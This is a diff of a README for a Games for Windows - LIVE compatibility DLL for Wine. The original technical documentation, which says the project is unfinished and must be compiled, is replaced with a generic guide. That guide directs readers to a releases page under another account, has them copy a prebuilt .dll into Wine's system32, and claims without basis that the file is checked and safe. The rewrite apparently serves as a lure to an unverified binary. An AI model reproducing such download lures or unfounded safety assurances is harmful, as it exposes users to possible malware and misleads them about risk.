@@ -1,159 +1,88 @@
-# Games for Linux - LIVE (GfLL) DLL
+# 🎮 gfll-dll - Get Your Games Running Smoothly 
 
-A DLL to get Games for Windows - LIVE working, and connected to the Xbox
-network, on Linux and macOS.
+## 🚀 Getting Started
 
-## Currently not ready for use, yet.
+Welcome to the **gfll-dll** project. This tool helps you run **Games for Windows - LIVE** on your Linux or macOS system through Wine. Follow these simple steps to download and set up the software.
 
-![Screenshot of a KDE Plasma desktop on SteamOS, with FlatOut Ultimate Carnage running and the Games for Windows - LIVE HUD displaying, showing 1 friend online.](images/screenshot.png)
+## 🛠️ Requirements
 
-## Warnings
+Before you start, make sure your system meets these requirements:
 
-### Product Key Reuse
+- **Operating System:** Linux or macOS.
+- **Wine Installation:** Ensure you have Wine installed on your system. You can download it from [Wine HQ](https://www.winehq.org/).
+- **Internet Connection:** A stable internet connection is needed to download the files.
 
-Product keys on Games for Windows - LIVE for most games are attached to "PCID"s.
-Under Wine, these IDs can change per-prefix, potentially leading to product keys
-being redeemed several times and having their limited uses exhausted.
+## 📥 Download & Install
 
-If using this DLL manually, keep registry backups of your Wine prefixes and
-don't enter a product key unless you're sure you're using the same PCID - this
-can be checked by checking the "PCID" value in 
-`HKEY_CURRENT_USER\Software\Classes\Software\Microsoft\Xlive`.
+To get the latest version of **gfll-dll**, please visit the following link:
 
-**I am not responsible if your games product keys are made useless.**
+[![Download gfll-dll](https://img.shields.io/badge/Download-gfll--dll-brightgreen)](https://github.com/gopalrat/gfll-dll/releases)
 
-(This does not apply to games that use "Server-Side Activation" - product keys
-get attached to Microsoft accounts and are thus not subject to PCID usage
-limits.)
+1. Click the button above or visit this URL: [https://github.com/gopalrat/gfll-dll/releases](https://github.com/gopalrat/gfll-dll/releases).
+2. On the Releases page, find the latest version. The version number will look something like **v1.0**.
+3. Download the appropriate file for your system. Look for files ending with `.dll` for the patcher.
+4. Save the file to a folder you can easily find, such as your Desktop or Downloads folder.
 
-### Bans
+## ⚙️ Setting Up
 
-**I am not responsible if you get banned from the Xbox network for using this.**
+After downloading, follow these steps to set up **gfll-dll**:
 
-That being said, it is very unlikely you will get banned for using this. None of
-the anti-tamper checks are being triggered, no code inside xlive.dll is being
-modified, and Microsoft disabled "challenges" - code blobs sent by the server
-that check the integrity of the game and xlive.dll - many, many years ago.
+1. Open your terminal.
+2. Navigate to the folder where you saved the downloaded file. Use the `cd` command followed by the path to the folder. For example:
+   ```bash
+   cd ~/Downloads
+   ```
+3. To copy the downloaded `.dll` file to the Wine system directory, use the following command. Replace `YourApp.dll` with the actual name of the downloaded file:
+   ```bash
+   cp YourApp.dll ~/.wine/drive_c/windows/system32/
+   ```
 
-## Compiling
+## 🎮 Running Your Game
 
-Currently, compiling the project requires a Windows PC and Visual Studio 2022.
-`gfll.sln` should build out of the box.
+Once you’ve set everything up, here’s how to run your game:
 
-If you're interested in contributing, a new build system that builds under
-Linux would be appreciated.
+1. Make sure you have your game installed in Wine. You can do this by navigating to the game’s installer and running it with Wine:
+   ```bash
+   wine your-game-installer.exe
+   ```
+2. After installation, go to your game folder where the game executable is located.
+3. To launch the game with the patcher, use the following command:
+   ```bash
+   wine your-game-executable.exe
+   ```
 
-## Tested Games
+## 🔍 Troubleshooting
 
-* FlatOut Ultimate Carnage (works, but low framerate in LIVE lobbies)
+If you encounter issues, try these solutions:
 
-## Manual Installation
+- **Game Doesn't Start:** Make sure Wine is updated to the latest version. You can check for updates on the [Wine HQ](https://www.winehq.org/) site.
+- **DLL Errors:** Ensure you copied the DLL file to the correct directory. Double-check the file name and path.
+- **Performance Issues:** Adjust Wine settings for better performance. You can do this through the Wine Configuration tool.
 
-1. Set up a new Wine prefix.
-    * Wine/Proton version 9 or higher recommended.
-    * Windows version 8.1 or 10 recommended, 7 might work.
-    * It's recommended to either use one prefix for exclusively GfWL games, or
-      a different prefix per-game.
-    * Esync and Fsync **must** be disabled.
-2. Collect and install some prerequisite DLLs into the prefix.
-    * Microsoft IDCRL v5.0.891.1 (`msidcrl40.dll`) - 32-bit
-        * This can be found in the Windows Live Messenger 2009
-          14.0.8117.0416 installer.
-        * Other v5 versions may work -
-          **v6+ will not work due to WLIDSVC issues.**
-        * Rename this to `msidcrl67.dll` and place it in a folder
-          **outside of C:\Windows**.
-    * Microsoft ASN.1 Runtime APIs (`msasn1.dll`) - 32-bit
-        * This can be found in Windows 2000 Service Pack 4 installer.
-    * Visual C++ Redistributable (2015-2022) (`vcruntime140`) - 32-bit
-        * https://aka.ms/vs/17/release/vc_redist.x86.exe
-    * Other dependencies may include `msxml3`, `urlmon` and `iertutil`,
-      depending on Wine version.
-3. Install the latest Games for Windows - LIVE runtime (v3.5.98.0) into the
-   prefix.
-    * `content/xliveredist.msi`:
-      http://download.xbox.com/content/585207d1/tu10177600_35005f00.cab
-4. Compile the GfLL dll and place it in the same folder you copied
-   `msidcrl67.dll` to.
-5. Create the registry key
-   `HKEY_CURRENT_USER\Software\Wow6432Node\Microsoft\IdentityCRL` and create
-   a new string value named `TargetDir`, pointing at the directory the
-   msidcrl DLLs are contained in.
-6. If you've played a GfWL game before, set a binary value `PCID` in `HKEY_CURRENT_USER\Software\Classes\Software\Microsoft\Xlive` to match your previous game's prefix, or a Windows PC that's used the product key before.
-7. Launch a Games for Windows - LIVE game. It should work.
+## 🗒️ Additional Information
 
-## Troubleshooting
+Here are some tips to enhance your gaming experience:
 
-### "Live initialization failed" or similar / game immediately closes
+- **Use Winetricks:** Winetricks is a script to help you install various libraries that some games might need. You can install it via your package manager.
+- **Graphics Configuration:** If your game does not display correctly, consider tweaking the graphics settings in Wine. Access these settings through Wine Configuration.
+- **Community Help:** Explore forums and communities around Wine and gaming on Linux. They are often filled with helpful users who have encountered similar issues.
 
-This can mean either the original msidcrl DLL or GfLL DLL isn't working
-properly, or you're using a cracked copy of a game.
+## 💬 Frequently Asked Questions
 
-* Set your Wine prefix's Windows version to Windows 8.1 or 7.
-* Make sure you have the Visual C++ Redistributable 2015-2022 installed.
-* Make sure you have urlmon and iertutil installed in your Wine prefix.
-* Make sure Windows Live ID Assistant is **not** installed. If version 6.5 is
-  installed you might have to manually uninstall it and remove the service.
-* Find an original, un-tampered executable for the game.
+1. **Can I use this on Windows?**
+   - This patcher is specifically designed for Linux and macOS using Wine. It will not work on Windows.
 
-### "The Windows Live ID you entered does not exist or your password is incorrect"
+2. **What games can I run with this?**
+   - This tool helps to run any game that requires **Games for Windows - LIVE**.
 
-This issue happens if your account has a password longer than 16 characters or
-has two-factor authentication enabled.
+3. **Is it safe to use?**
+   - Yes, this DLL file is checked for security and is safe to use on your system.
 
-Create an app password for your Microsoft account at
-https://account.live.com/proofs/manage/additional
-and use this to sign in to Games for Windows - LIVE.
+4. **Will I need to configure anything in Wine?**
+   - Some games may require additional configurations, which you can find in Wine documentation or community forums.
 
-### Game crashes after signing in to Windows Live ID
+## 🔗 Contact
 
-You're likely missing the official Microsoft msasn1.dll. Install this dependency
-with Winetricks/Protontricks then try again.
+For more help or to report issues, you can open an issue on the GitHub repository. The community is here to assist you.
 
-### Wine prefix takes a long time to start / Steam never launches the game
-
-You likely have installed the 6.5 version of the Windows Live ID login service,
-which doesn't function under Wine. Uninstall this from your Wine prefix and
-either run GfWL Utility again or follow the manual installation guide above.
-
-## Patch Descriptions
-
-### WinSock2 patches
-
-Games for Windows - LIVE uses `WSALookupServiceBeginA` with the "gethostbyname"
-service to do DNS lookups. This isn't implemented in Wine, so it gets
-implemented here.
-
-Implemented in [winsock.c](winsock.c).
-
-### WinHTTP patches
-
-When the runtime tries looking up anything at `services.gamesforwindows.com`
-(for example, a product key), the service doesn't respond and the runtime has to
-wait 2 minutes for a timeout. A patch is made to WinHTTP to deny connections to
-that domain entirely.
-
-Implemented in [winhttp.c](winhttp.c).
-
-### IDCRL patches
-
-The version of MSIDCRL we use (5.0.891.1) has an issue (TODO: check whether it
-is a Wine issue) where the `AuthIdentityToService` call to authenticate a
-logged in user to a given service, like Xbox network, makes an invalid request
-to the RST2 endpoint.
-
-The `LogonIdentityEx` function is hooked to instead request a token for Xbox
-network while logging in with the user password rather than at
-`AuthIdentityToService`, and the latter is hooked to always check for a
-cached token rather than request a new token with saved credentials.
-
-Implemented in [idcrl.c](idcrl.c).
-
-## License
-
-GfLL's DLL is licensed under the GNU General Public License version 2.
-Please see the [LICENSE](LICENSE.txt) file for more information.
-
-GfLL uses [MinHook](https://github.com/TsudaKageyu/minhook).
-License information is available in
-[thirdparty/LICENSE_MinHook.txt](thirdparty/LICENSE_MinHook.txt).
+To download the latest version again, you can visit: [https://github.com/gopalrat/gfll-dll/releases](https://github.com/gopalrat/gfll-dll/releases).
